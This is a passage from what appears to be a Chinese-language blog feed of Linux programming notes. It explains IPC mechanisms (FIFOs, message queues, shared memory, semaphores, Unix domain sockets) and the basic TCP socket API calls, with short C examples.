pipe，也称为FIFO，与管道不同之处在于提供一个路径名与之关联，以FIFO文件形式存在于文件系统中；即使与FIFO创建进程无亲缘关系的进程，只要能访问该路径，就能够通过FIFO相互通信；由于它作为一种特殊的文件存放于文件系统中，而不是像管道一样存放于内存（使用完毕后消失），当使用结束后，命名管道依然存在于文件系统中，除非将其删除；FIFO严格遵循先入先出的规则，读总是从开始处返回数据，写则把数据添加到末尾，不支持lseek等文件定位操作</p><ul><li>使用命名管道的操作与使用普通文件类似；</li><li>用open函数打开一个命名管道；</li><li>用read和write函数对命名管道进行读写；</li><li>用close函数关闭一个命名管道；</li><li>如要删除一个命名管道，则使用unlink函数</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mkfifo</span><span class="params">(<span class="keyword">char</span> *pathname, <span class="keyword">mode_t</span> mode)</span></span>;</span><br><span class="line">参数：</span><br><span class="line">pathname－管道名称，绝对路径名</span><br><span class="line">mode－打开文件的模式</span><br><span class="line">返回值</span><br><span class="line"><span class="number">0</span>－成功，<span class="number">-1</span>－失败</span><br><span class="line">如果第一个参数是一个已经存在的路径名时，则返回EEXIST错误，如果返回该错误，只要调用打开FIFO的函数就可以了</span><br></pre></td></tr></table></figure><h1 id="消息队列"><a href="#消息队列" class="headerlink" title="消息队列"></a>消息队列</h1><p>消息队列是一种以链表式结构组织的一组数据，存放于内核中，是由各进程通过消息队列标识符来引用的一种数据传送方式；可以把消息看成一个记录，具有特定的格式，对消息队列有写权限的进程可以向其中按照一定的规则添加新消息，对消息队列有读权限的进程则可以从消息队列中读走消息；每个消息队列都在系统范围内对应一个唯一的键值，消息队列的标识符（ID）就是由该键值生成的，而键值对应了系统内的一条路径。ftok函数能够由路径获得消息队列的键值；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">key_t</span> ftok(<span class="keyword">char</span> *pathname, <span class="keyword">char</span> proj_id);</span><br><span class="line"></span><br><span class="line">功能：获得特定文件路径名的键值</span><br><span class="line">参数：</span><br><span class="line">pathname－指定的文件（路径）名</span><br><span class="line">proj_id－子序号</span><br><span class="line">返回值</span><br><span class="line">成功时返回与路径pathname相对应的一个键值（通常与指定文件的索引节点号相关），失败则返回<span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line">功能：创建消息队列</span><br><span class="line">参数：</span><br><span class="line">key－由ftok函数获得的键值，或指定为IPC_PRIVATE，由系统分配</span><br><span class="line">flags－标志位，类似于打开和创建文件时的参数</span><br><span class="line">返回值</span><br><span class="line">消息队列的引用标识符ID－成功，<span class="number">-1</span>－失败</span><br><span class="line"></span><br><span class="line">关于消息队列的收发和参数控制</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgsnd</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf *buf, <span class="keyword">int</span> nbytes, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgrcv</span><span class="params">(<span class="keyword">int</span> msqid, struct msgbuf *msgp, <span class="keyword">int</span> nbytes, <span class="keyword">long</span> mtype, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">msgctl</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">int</span> cmd, struct msqid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure><h1 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h1><p>共享内存是Linux下最快速、最有效的进程间通信方式，只需拷贝两次数据：一次从应用输入到共享内存区，另一次从共享内存区到应用输出，而且会保持映射直到通信结束。(注意到前面的消息队列以及管道都需要copy四次数据：输入-&gt;发送方缓冲区-&gt;内核缓冲区-&gt;接收方缓冲区-&gt;输出。）最大不足：由于多个进程对同一块内存区域具有访问的权限，进程间同步问题突出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">创建共享内存段：</span><br><span class="line">int shmget(key_t key, int size, int flags);</span><br><span class="line">将共享内存段映射到进程虚拟地址空间：</span><br><span class="line">char *shmat(int segid, char *addr, int flags);</span><br><span class="line">返回共享内存段在进程虚拟地址空间的首地址</span><br><span class="line">解除共享内存段的映射：</span><br><span class="line">int shmdt(char *addr);</span><br><span class="line">共享内存段控制：</span><br><span class="line">int shmctl(int segid, int cmd, struct shmid_ds *sbuf);</span><br></pre></td></tr></table></figure></p><h1 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h1><p>信号量是一种数据操作锁的概念，本身不具备数据交换的功能，而是通过控制其他的通信资源（比如文件、外设等）来实现进程间通信，是一种外部资源的标识；抽象的讲，信号灯是一个非负整数，所有通过它的进程/线程都会将该整数减1，当该整数为零时，所有试图通过它的进程都将处于等待状态；定义两种操作：wait（等待）和release（释放）。类似于操作系统中的P、V操作。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">创建：</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> nsems, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line">操作：</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semop</span><span class="params">(<span class="keyword">int</span> semid, struct sembuf *ops, <span class="keyword">size_t</span> nops)</span></span>;</span><br><span class="line">控制：</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semctl</span><span class="params">(<span class="keyword">int</span> semid, <span class="keyword">int</span> semnum, <span class="keyword">int</span> cmd, <span class="keyword">union</span> semun arg)</span></span>;</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line"><span class="comment">//创建信号量</span></span><br><span class="line"><span class="keyword">int</span> sem_id;</span><br><span class="line">sem_id = semget((<span class="keyword">key_t</span>)<span class="number">1234</span>, <span class="number">1</span>, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">set_semvalue</span><span class="params">(sem_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//用于初始化信号量，在使用信号量前必须这样做</span></span><br><span class="line"><span class="keyword">union</span> semun sem_union;</span><br><span class="line"> </span><br><span class="line">sem_union.val = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(semctl(sem_id, <span class="number">0</span>, SETVAL, sem_union) == <span class="number">-1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">del_semvalue</span><span class="params">(sem_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//删除信号量</span></span><br><span class="line"><span class="keyword">union</span> semun sem_union;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(semctl(sem_id, <span class="number">0</span>, IPC_RMID, sem_union) == <span class="number">-1</span>)</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Failed to delete semaphore\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">semaphore_p</span><span class="params">(sem_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//对信号量做减1操作，即等待P（sv）</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">sem_b</span>;</span></span><br><span class="line">sem_b.sem_num = <span class="number">0</span>;</span><br><span class="line">sem_b.sem_op = <span class="number">-1</span>;<span class="comment">//P()</span></span><br><span class="line">sem_b.sem_flg = SEM_UNDO;</span><br><span class="line"><span class="keyword">if</span>(semop(sem_id, &amp;sem_b, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"semaphore_p failed\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">semaphore_v</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//这是一个释放操作，它使信号量变为可用，即发送信号V（sv）</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sembuf</span> <span class="title">sem_b</span>;</span></span><br><span class="line">sem_b.sem_num = <span class="number">0</span>;</span><br><span class="line">sem_b.sem_op = <span class="number">1</span>;<span class="comment">//V()</span></span><br><span class="line">sem_b.sem_flg = SEM_UNDO;</span><br><span class="line"><span class="keyword">if</span>(semop(sem_id, &amp;sem_b, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"semaphore_v failed\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="unix-域套接字"><a href="#unix-域套接字" class="headerlink" title="unix 域套接字"></a>unix 域套接字</h1><p>UNIX域套接字比Internet套接字效率更高。因为其只需要处理本机进程通信，少去了传输层及以下的封装，同时由于进程都有操作系统内核管理，更好的流量控制。unix套接字分为非命名和命名两种。命名套接字的操作跟普通的socket操作一致。而非命名套接字的机制就类似无名管道，不同是，linux 域套接字是全双工的。</p><h2 id="命名unix-域套接字"><a href="#命名unix-域套接字" class="headerlink" title="命名unix 域套接字"></a>命名unix 域套接字</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socketaddr_un</span> &#123;</span></span><br><span class="line"><span class="keyword">short</span> <span class="keyword">int</span> sun_family;<span class="comment">//AF_UNIX</span></span><br><span class="line"><span class="keyword">char</span> sun_path[<span class="number">108</span>];<span class="comment">//文件名的绝对路径</span></span><br><span class="line">&#125;；</span><br></pre></td></tr></table></figure><p>注意到命名unix域套接字使用sun_path唯一标识服务端，与网络socket通过ip和端口进行标识是由一定的不同。 </p><h2 id="非命名unix-域套接字"><a href="#非命名unix-域套接字" class="headerlink" title="非命名unix 域套接字"></a>非命名unix 域套接字</h2><p>socket是无名的；通信前不需要经过地址绑定、建立连接过程，与pipe相似；socket是全双工的，而pipe创建的是单向信道。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socketpair</span><span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol, <span class="keyword">int</span> fd[<span class="number">2</span>])</span></span>;</span><br><span class="line">创建两个UNIX域socket，并连接在一起</span><br><span class="line">参数：</span><br><span class="line">family－AF_UNIX</span><br><span class="line">type－SOCK_STREAM或SOCK_DGRAM</span><br><span class="line">protocol－<span class="number">0</span></span><br><span class="line">fd－创建的两个套接字句柄存在socket[<span class="number">0</span>]/[<span class="number">1</span>]</span><br><span class="line">返回值：<span class="number">0</span>－成功，<span class="number">-1</span>－失败</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>linux socket 编程</title>
      <link href="/2018/12/11/linux-socket-%E7%BC%96%E7%A8%8B/"/>
      <url>/2018/12/11/linux-socket-%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>套接字编程大致可以分为以下三种：流式套接字(stream)，数据报式套接字(datagram)以及原生套接字（row）。其中用得比较多的式流式套接字和数据报套接字。下面主要对所学的Linux下的socket编程进行学习记录。<br><a id="more"></a></p><h1 id="基于TCP的socket编程"><a href="#基于TCP的socket编程" class="headerlink" title="基于TCP的socket编程"></a>基于TCP的socket编程</h1><ul><li>TCP服务器通常采用并发服务器模型</li></ul></blockquote><h2 id="以下函数依赖的头文件汇总"><a href="#以下函数依赖的头文件汇总" class="headerlink" title="以下函数依赖的头文件汇总"></a>以下函数依赖的头文件汇总</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="套接字的创建"><a href="#套接字的创建" class="headerlink" title="套接字的创建"></a>套接字的创建</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span> <span class="params">(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">功能：创建socket</span><br><span class="line">参数：（P34表<span class="number">2</span><span class="number">-1</span>描述了可能的参数值）</span><br><span class="line">family（协议簇）：AF_INET、AF_UNIX等</span><br><span class="line">type（类型）：SOCK_STREAM、SOCK_DGRAM、SOCK_RAW</span><br><span class="line">protocol（协议）：默认为<span class="number">0</span></span><br><span class="line"></span><br><span class="line">返回值：&gt;<span class="number">0</span>－socket描述符， <span class="number">-1</span>－失败， 系统全局变量errno为错误代码（strerror函数显示描述字符串）</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockfd=socket(AF_INET,</span><br><span class="line">SOCK_STREAM,</span><br><span class="line"><span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sockfd==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(“can <span class="keyword">not</span> create socket\n<span class="string">");</span></span><br><span class="line"><span class="string">exit(1);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">…</span></span><br></pre></td></tr></table></figure><p>可以注意到，这个函数其实是在本地创建一个socket 文件描述符，因为在linux下一切兼文件。所以对套接字的操作抽象为对文件描述符的操作，这样我们可以方便使用read(),write()操作对socket进行读写。当然使用socket 系列函数也是可以的。</p><h2 id="sockaddr-结构体的赋值"><a href="#sockaddr-结构体的赋值" class="headerlink" title="sockaddr 结构体的赋值"></a>sockaddr 结构体的赋值</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sockaddr 结构体：</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">short</span> sin_family;  <span class="comment">/*AF_INET*/</span></span><br><span class="line">    u_short sin_port;     <span class="comment">/*端口号，网络字节序*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span>  <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>   <span class="comment">/*IP地址，网络字节序*/</span></span><br><span class="line">    <span class="keyword">char</span>    sin_zero[<span class="number">8</span>]; <span class="comment">/*填充字节，必须为全零*/</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">    u_long  s_addr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">使用举例：</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srvaddr</span>;</span></span><br><span class="line">bzero(&amp;srvaddr, <span class="keyword">sizeof</span>(srvaddr));</span><br><span class="line">srvaddr.sin_family = AF_INET;</span><br><span class="line">srvaddr.sin_port = htons(srvport);</span><br><span class="line">srvaddr.sin_addr.s_addr=htonl(INADDR_ANY);</span><br><span class="line">…</span><br></pre></td></tr></table></figure><p>注意到sockaddr 结构体中的sin_port 字段和 sin_addr 字段需要转换为网络字节序，因为不同的系统上面对数字的存储有大端存储和小端存储两个方式，在进行socket编程的时候需要规范化。规范的方式就是调用<code>htons()</code>,<code>htonl()</code>函数。或者使用以下两个函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_aton</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *cp, struct in_addr *inp)</span></span>;</span><br><span class="line">将点分IP地址格式转换为无符号整型</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">inet_ntoa</span> <span class="params">(struct in_addr in)</span></span>;</span><br><span class="line">将无符号整型转换为点分格式</span><br><span class="line"></span><br><span class="line">举例：</span><br><span class="line"><span class="comment">//点分字符串格式地址转换为无符号整型</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">inet_aton(“<span class="number">219.245</span><span class="number">.78</span><span class="number">.159</span>”,&amp;addr.sin_addr);</span><br><span class="line"><span class="comment">//无符号整型转换为点分字符串格式</span></span><br><span class="line"><span class="built_in">printf</span>(“%s”,inet_ntoa(addr.sin_addr));</span><br></pre></td></tr></table></figure></p><h2 id="绑定套接字描述符与sockaddr-结构体"><a href="#绑定套接字描述符与sockaddr-结构体" class="headerlink" title="绑定套接字描述符与sockaddr 结构体"></a>绑定套接字描述符与sockaddr 结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span> <span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *myaddr, <span class="keyword">int</span> addrlen)</span></span>; </span><br><span class="line">功能：将地址与所创建的套接字进行关联</span><br><span class="line">参数：</span><br><span class="line">sockfd－socket描述符</span><br><span class="line">myaddr－自己的地址</span><br><span class="line">addrlen－地址结构长度（如何表示？）</span><br><span class="line">返回值：</span><br><span class="line"><span class="number">0</span>－成功，<span class="number">-1</span>－失败，errno为错误代码 </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( bind(sockfd,</span><br><span class="line">(struct sockaddr *)&amp;srvaddr,</span><br><span class="line"><span class="keyword">sizeof</span>(struct sockaddr) )==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bind error\n"</span>);</span><br><span class="line">close(sockfd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">…</span><br></pre></td></tr></table></figure><h2 id="监听端口"><a href="#监听端口" class="headerlink" title="监听端口"></a>监听端口</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span> <span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span></span><br><span class="line">功能：建立一个连接请求等待队列，监听本地地址和端口</span><br><span class="line">参数：</span><br><span class="line">sockfd－已绑定的socket描述符</span><br><span class="line">backlog－连接请求队列长度（门限值），当连接请求到达时，被插入请求队列，以避免由于服务器忙而将请求拒绝</span><br><span class="line">返回值</span><br><span class="line"><span class="number">0</span>－成功，<span class="number">-1</span>－失败，errno为错误代码 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听端口示例：</span></span><br><span class="line"><span class="keyword">if</span>( listen(sockfd, BACKLOG) ==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"listen error\n"</span>);</span><br><span class="line">close(sockfd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">…</span><br></pre></td></tr></table></figure><p>执行listen后socket转换成被动socket，可以接受连接；<code>listen()</code>函数只能用在在TCP面向连接方式下的socket，比如<code>SOCK_STREAM</code>，面向无连接的方式，一般没有listen这个操作，后面会看到；<br>当一个连接请求到达时，被插入请求队列，服务器用accept()函数从队列中移走并响应请求。</p><h2 id="客户端链接服务器"><a href="#客户端链接服务器" class="headerlink" title="客户端链接服务器"></a>客户端链接服务器</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span> <span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *servaddr, <span class="keyword">int</span> addrlen)</span></span></span><br><span class="line">功能：连接服务器</span><br><span class="line">参数：</span><br><span class="line">sockfd－socket描述符</span><br><span class="line">servaddr－服务器地址</span><br><span class="line">addrlen－地址结构长度</span><br><span class="line">返回值：</span><br><span class="line"><span class="number">0</span>－成功，<span class="number">-1</span>－失败，errno为错误代码</span><br><span class="line"></span><br><span class="line"><span class="comment">//连接服务器，调用前需要对srvaddr进行初始化</span></span><br><span class="line">If (connect(sockfd,</span><br><span class="line">(struct sockaddr *)&amp;srvaddr,</span><br><span class="line"><span class="keyword">sizeof</span>(struct sockaddr))==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connect error\n"</span>);</span><br><span class="line">close(sockfd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到一般客户端不指定自己的端口号，而是由操作系统分配给我们一个空闲的临时端口。</p><h2 id="服务端接受客户端链接"><a href="#服务端接受客户端链接" class="headerlink" title="服务端接受客户端链接"></a>服务端接受客户端链接</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span> <span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *clientaddr, <span class="keyword">int</span> *addrlen)</span></span>;</span><br><span class="line">功能：接受连接</span><br><span class="line">参数：</span><br><span class="line">sockfd－socket描述符</span><br><span class="line">clientaddr－客户端地址</span><br><span class="line">addrlen－地址结构长度</span><br><span class="line">返回值</span><br><span class="line">&gt;<span class="number">0</span>－成功，返回新的socket描述符标识已接受的连接</span><br><span class="line"><span class="number">-1</span>－失败，errno为错误代码</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sin_size=<span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line"><span class="keyword">int</span> new_fd=accept(sockfd,</span><br><span class="line">(struct sockaddr *)&amp;clientaddr,</span><br><span class="line">&amp;sin_size) ;</span><br><span class="line">If (new_fd==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"accept error\n"</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span 